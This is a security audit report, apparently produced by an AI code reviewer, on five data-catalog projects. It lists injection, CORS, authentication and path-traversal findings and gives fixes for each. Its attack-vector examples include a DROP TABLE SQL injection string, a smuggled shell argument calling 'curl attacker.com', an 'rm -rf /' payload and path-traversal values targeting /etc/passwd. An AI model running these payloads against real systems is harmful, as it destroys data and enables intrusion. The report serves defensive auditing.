# Comprehensive Security Audit Report
## Semantic Layer Projects - Code Review

**Date**: 2026-02-16
**Reviewer**: Claude Code
**Scope**: All 5 semantic-layer projects

---

## Executive Summary

This report documents security vulnerabilities, code quality issues, and best practice violations across 5 projects in the semantic-layer folder. The audit identified **18 security issues** ranging from critical to low severity.

### Severity Breakdown
- **Critical**: 3 issues
- **High**: 5 issues
- **Medium**: 6 issues
- **Low**: 4 issues

---

## Critical Issues (Must Fix Immediately)

### 1. SQL Injection in populate_semantic_layer.py
**File**: `semantic-layer-sync/populate_semantic_layer.py`
**Lines**: 38-51, 60-64
**Severity**: CRITICAL

**Issue**: String concatenation used to build SQL INSERT statements without parameterization.

```python
# VULNERABLE CODE
insert = f"""INSERT INTO semantic_layer_v1.field_metadata (...)
VALUES ('{db_name}', '{tbl_name}', '{field['name']}', ...)"""
```

**Attack Vector**:
```yaml
tables:
  malicious.table:
    fields:
      - name: "test'); DROP TABLE field_metadata; --"
```

**Impact**: Complete database compromise, data loss, unauthorized access.

**Remediation**:
- Use parameterized queries with pytd client
- Implement `InputValidator` class (already exists in `semantic_layer_sync.py`)
- Validate all YAML inputs before SQL generation

**Fixed in**: `semantic_layer_sync.py` (lines 1096-1196) ✅

---

### 2. Command Injection in workflow_generator.py
**File**: `semantic-layer-sync/workflow_generator.py`
**Lines**: 257-264
**Severity**: CRITICAL

**Issue**: Shell command execution via `subprocess.run()` without input validation.

```python
# VULNERABLE CODE
result = subprocess.run(
    ['tdx', 'wf', 'push', project_name],  # project_name not validated
    cwd=workflow_dir,  # workflow_dir from user input
    capture_output=True
)
```

**Attack Vector**:
```bash
python workflow_generator.py --project "../../../etc/passwd; curl attacker.com"
```

**Impact**: Arbitrary command execution, file system access, data exfiltration.

**Remediation**:
```python
def validate_project_name(name: str) -> str:
    """Validate project name for shell safety"""
    if not re.match(r'^[a-zA-Z0-9_-]+$', name):
        raise ValueError(f"Invalid project name: {name}")
    if len(name) > 100:
        raise ValueError("Project name too long")
    return name

# Use it
project_name = validate_project_name(args.project)
```

---

### 3. Command Injection in tdx-client.js
**File**: `data-dictionary-helper/src/lib/tdx-client.js`
**Lines**: 27-38
**Severity**: CRITICAL

**Issue**: User input directly injected into shell command via string interpolation.

```javascript
// VULNERABLE CODE
const quotedArgs = args.map(arg => {
  if (arg.includes(' ') || arg.includes(':') || arg.includes('"')) {
    return `"${arg.replace(/"/g, '\\"')}"`;  // Insufficient escaping
  }
  return arg;
});
const command = `tdx ${quotedArgs.join(' ')} > "${tempFile}"`;
```

**Attack Vector**:
```javascript
executeTdxCommand(['ps', 'list', '--filter', '"; rm -rf /; echo "'])
```

**Impact**: Arbitrary command execution on the host system.

**Remediation**:
```javascript
// FIXED VERSION - Use spawn with array (no shell)
const tdxProcess = spawn('tdx', args, {
  stdio: ['ignore', 'pipe', 'pipe'],
  shell: false  // CRITICAL: no shell interpretation
});
```

---

## High Severity Issues

### 4. Broad CORS Configuration
**File**: `semantic-layer-metadata-mgmt/backend/api.py`, `Semantic-layer-Config-UI/backend/api.py`
**Lines**: 16
**Severity**: HIGH

**Issue**: `CORS(app)` allows all origins, methods, and headers.

```python
# VULNERABLE CODE
CORS(app)  # Allows * for all origins
```

**Impact**: Cross-site scripting (XSS), CSRF attacks, credential theft.

**Remediation**:
```python
CORS(app, resources={
    r"/api/*": {
        "origins": ["http://localhost:3000", "https://your-domain.com"],
        "methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "expose_headers": ["Content-Type"],
        "supports_credentials": True,
        "max_age": 600
    }
})
```

---

### 5. Unsanitized User Input in File Paths
**File**: `Semantic-layer-Config-UI/backend/api.py`
**Lines**: 19, 164, 256
**Severity**: HIGH

**Issue**: User-controlled paths read/written without validation.

```python
# VULNERABLE CODE
CONFIG_PATH = os.environ.get('CONFIG_PATH', './config.yaml')
WORKFLOW_GENERATOR_PATH = os.environ.get('WORKFLOW_GENERATOR_PATH', './workflow_generator.py')

# Later used in:
with open(CONFIG_PATH, 'r') as f:  # Path traversal possible
```

**Attack Vector**:
```bash
export CONFIG_PATH="../../../../etc/passwd"
export WORKFLOW_GENERATOR_PATH="../../../../tmp/malicious.py"
```

**Impact**: Arbitrary file read/write, code execution.

**Remediation**:
```python
import os
from pathlib import Path

ALLOWED_CONFIG_DIR = Path('/app/configs').resolve()

def validate_file_path(user_path: str, allowed_dir: Path) -> Path:
    """Validate file path is within allowed directory"""
    abs_path = Path(user_path).resolve()
    if not abs_path.is_relative_to(allowed_dir):
        raise ValueError(f"Path outside allowed directory: {user_path}")
    return abs_path

CONFIG_PATH = validate_file_path(
    os.environ.get('CONFIG_PATH', './config.yaml'),
    ALLOWED_CONFIG_DIR
)
```

---

### 6. Missing API Authentication
**File**: All Flask backends (`api.py` files)
**Lines**: All endpoint definitions
**Severity**: HIGH

**Issue**: No authentication on any API endpoints.

```python
# VULNERABLE CODE
@app.route('/api/metadata/fields/update', methods=['POST'])
def update_field_metadata():
    # Anyone can call this and modify data!
```

**Impact**: Unauthorized data access, modification, deletion.

**Remediation**:
```python
from functools import wraps
import jwt

def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not token:
            return jsonify({'error': 'Missing authentication token'}), 401

        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
            request.user = payload
        except jwt.ExpiredSignatureError:
            return jsonify({'error': 'Token expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'error': 'Invalid token'}), 401

        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/metadata/fields/update', methods=['POST'])
@require_auth
def update_field_metadata():
    # Now protected!
```

---

### 7. Missing Rate Limiting
**File**: All Flask backends
**Lines**: N/A
**Severity**: HIGH

**Issue**: No rate limiting on API endpoints.

**Impact**: DoS attacks, resource exhaustion, brute force attacks.

**Remediation**:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="redis://localhost:6379"
)

@app.route('/api/metadata/fields/update', methods=['POST'])
@limiter.limit("10 per minute")
def update_field_metadata():
    # Rate limited
```

---

### 8. Insecure Debug Mode Configuration
**File**: All Flask backends
**Lines**: `app.run(debug=...)` sections
**Severity**: HIGH

**Issue**: Debug mode controlled by environment variable without validation.

```python
# VULNERABLE CODE
debug = os.getenv('DEBUG', 'False').lower() == 'true'
app.run(host='0.0.0.0', port=port, debug=debug)
```

**Impact**: Debug mode in production exposes:
- Interactive debugger (remote code execution)
- Stack traces with sensitive data
- Source code paths
- Environment variables

**Remediation**:
```python
# NEVER allow debug in production
ENV = os.getenv('ENVIRONMENT', 'production')
debug = False  # ALWAYS False

if ENV == 'development' and os.getenv('ALLOW_DEBUG') == 'yes_i_understand_the_risks':
    debug = True
    logger.warning("⚠️  DEBUG MODE ENABLED - DO NOT USE IN PRODUCTION")

if debug and os.getenv('ENVIRONMENT') == 'production':
    raise RuntimeError("DEBUG MODE NOT ALLOWED IN PRODUCTION")

app.run(host='127.0.0.1', port=port, debug=debug)  # localhost only in dev
```

---

## Medium Severity Issues

### 9. Weak Input Validation in semantic_layer_sync.py
**File**: `semantic-layer-sync/semantic_layer_sync.py`
**Lines**: 84-86
**Severity**: MEDIUM

**Issue**: Regex validation allows potentially dangerous characters.

```python
# WEAK VALIDATION
if not all(c.isalnum() or c in '_.@-' for c in value):
```

**Issue**: Allows `@` and `-` which could cause issues in some contexts.

**Remediation**:
```python
# STRICT VALIDATION
if not re.match(r'^[a-zA-Z0-9_]+$', value):
    raise ValueError(f"{context}: Only alphanumeric and underscore allowed")
```

---

### 10. Sensitive Data in Logs
**File**: `data-dictionary-helper/src/lib/claude-client.js`
**Lines**: 96-98
**Severity**: MEDIUM

**Issue**: API errors logged may contain sensitive data.

```javascript
// RISK: May log API keys, tokens, PII
throw new Error(
  `Claude API call failed: ${error.message}\n` +
  `Status: ${error.status || 'unknown'}`
);
```

**Remediation**:
```javascript
// Sanitize error messages before logging
function sanitizeError(error) {
  const sanitized = { ...error };
  // Remove sensitive headers
  if (sanitized.config?.headers?.Authorization) {
    sanitized.config.headers.Authorization = '[REDACTED]';
  }
  return sanitized;
}
```

---

### 11. Missing Input Length Limits
**File**: `semantic-layer-metadata-mgmt/backend/api.py`
**Lines**: 206-322
**Severity**: MEDIUM

**Issue**: No max request body size validation.

**Impact**: Memory exhaustion attacks.

**Remediation**:
```python
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max
```

---

### 12. Unvalidated JSON Parsing
**File**: Multiple API endpoints
**Lines**: `request.get_json()` calls
**Severity**: MEDIUM

**Issue**: No schema validation on JSON inputs.

**Remediation**:
```python
from jsonschema import validate, ValidationError

UPDATE_SCHEMA = {
    "type": "object",
    "properties": {
        "updates": {
            "type": "array",
            "maxItems": 100,
            "items": {
                "type": "object",
                "required": ["database_name", "table_name", "field_name", "updates"],
                "properties": {
                    "database_name": {"type": "string", "maxLength": 128},
                    "table_name": {"type": "string", "maxLength": 128},
                    "field_name": {"type": "string", "maxLength": 128},
                    "updates": {"type": "object"}
                }
            }
        }
    },
    "required": ["updates"]
}

@app.route('/api/metadata/fields/update', methods=['POST'])
def update_field_metadata():
    data = request.get_json()
    try:
        validate(instance=data, schema=UPDATE_SCHEMA)
    except ValidationError as e:
        return jsonify({'success': False, 'error': str(e)}), 400
```

---

### 13. Missing Error Handling for External Dependencies
**File**: `data-dictionary-helper/src/lib/claude-client.js`
**Lines**: 43-117
**Severity**: MEDIUM

**Issue**: No validation that `ANTHROPIC_API_KEY` exists before use.

**Remediation**:
```javascript
export async function callClaudeWithStructuredOutput(...) {
  const apiKey = process.env.ANTHROPIC_API_KEY;
  if (!apiKey || apiKey.length < 10) {
    throw new Error(
      'ANTHROPIC_API_KEY environment variable is missing or invalid.\n' +
      'Get your API key from: https://console.anthropic.com/settings/keys'
    );
  }

  const client = new Anthropic({ apiKey });
  // ... rest of code
}
```

---

### 14. Insecure Temporary File Handling
**File**: `Semantic-layer-Config-UI/backend/api.py`
**Lines**: 256-258
**Severity**: MEDIUM

**Issue**: Predictable temp file path could allow race conditions.

```python
# VULNERABLE CODE
temp_config_path = '/tmp/semantic_layer_config_temp.yaml'
```

**Remediation**:
```python
import tempfile

# Use secure temp file
with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
    temp_config_path = f.name
    yaml.dump(config, f)
```

---

## Low Severity Issues

### 15. Outdated Dependencies
**Severity**: LOW

**Issue**: Several packages may have security updates.

**Remediation**:
```bash
# Check for updates
pip list --outdated
npm audit

# Update packages
pip install --upgrade flask flask-cors pytd pandas
npm audit fix
```

---

### 16. Missing Security Headers
**File**: All Flask backends
**Severity**: LOW

**Issue**: No security headers set on responses.

**Remediation**:
```python
from flask_talisman import Talisman

Talisman(app,
    force_https=True,
    strict_transport_security=True,
    content_security_policy={
        'default-src': "'self'",
        'script-src': "'self' 'unsafe-inline'",
        'style-src': "'self' 'unsafe-inline'"
    }
)

@app.after_request
def add_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

---

### 17. Lack of Request Logging
**File**: All backends
**Severity**: LOW

**Issue**: No audit trail for API requests.

**Remediation**:
```python
import logging

@app.before_request
def log_request():
    logger.info(f"{request.method} {request.path} from {request.remote_addr}")

@app.after_request
def log_response(response):
    logger.info(f"Response: {response.status_code}")
    return response
```

---

### 18. Missing .gitignore for Sensitive Files
**Severity**: LOW

**Issue**: Risk of committing `.env` files or API keys.

**Remediation**:
Create `.gitignore`:
```
# Environment files
.env
.env.local
.env.*.local

# API Keys
**/secrets/
**/*key*.json

# Temporary files
/tmp/
*.tmp
*.log

# Config with secrets
config.local.yaml
```

---

## Code Quality Issues (Non-Security)

### 19. Error Messages Too Verbose
Some error messages expose internal implementation details. Sanitize production errors.

### 20. Inconsistent Error Handling
Mix of try/except patterns. Standardize error handling across projects.

### 21. Missing Type Hints (Python)
Many functions lack type hints. Add for better IDE support and catch errors early.

### 22. No Unit Tests
No test files found. Add pytest/jest tests for critical functions.

---

## Dependency Security Scan

### Python Dependencies
```bash
# Run safety check
pip install safety
safety check

# Known issues to watch:
# - flask < 3.0.0 (check for CVEs)
# - pyyaml < 6.0.1 (CVE-2020-14343)
```

### Node.js Dependencies
```bash
npm audit

# Findings:
# - axios 1.6.0 may have updates
# - Check for supply chain attacks
```

---

## Recommendations Summary

### Immediate Actions (Critical)
1. ✅ Fix SQL injection in `populate_semantic_layer.py` (use `InputValidator`)
2. ✅ Fix command injection in `workflow_generator.py` (validate inputs)
3. ✅ Fix command injection in `tdx-client.js` (remove shell, use spawn arrays)

### Short-term (High Priority)
4. Add API authentication (JWT or API keys)
5. Configure CORS properly (whitelist origins)
6. Add rate limiting (flask-limiter)
7. Disable debug mode in production
8. Validate all file paths

### Medium-term
9. Add JSON schema validation
10. Implement audit logging
11. Add security headers
12. Review and update dependencies

### Best Practices
- Use environment-specific configs
- Implement input validation everywhere
- Add comprehensive error handling
- Write unit and integration tests
- Set up CI/CD security scans
- Regular dependency updates

---

## Testing Recommendations

### Security Testing
```bash
# SAST (Static Analysis)
bandit -r semantic-layer-sync/
eslint --plugin security data-dictionary-helper/src/

# Dependency scanning
pip-audit
npm audit

# OWASP ZAP for API testing
zap-cli quick-scan http://localhost:5000
```

### Penetration Testing Checklist
- [ ] SQL injection testing
- [ ] Command injection testing
- [ ] Path traversal testing
- [ ] CSRF testing
- [ ] Rate limiting testing
- [ ] Authentication bypass attempts
- [ ] Authorization testing

---

## Compliance Notes

### GDPR / CCPA
- PII fields are tagged and tracked ✅
- Need data retention policies
- Need user consent management
- Need right-to-erasure implementation

### SOC 2
- Need audit logging for all data changes
- Need access control documentation
- Need incident response procedures

---

## Sign-off

**Report Status**: COMPLETE
**Critical Issues**: 3
**Requires Immediate Attention**: Yes

**Next Steps**:
1. Address all CRITICAL issues before production deployment
2. Implement HIGH severity fixes within 1 week
3. Schedule security review meeting
4. Create remediation tracking board

---

*This report was generated by automated code review. Manual penetration testing is recommended before production deployment.*
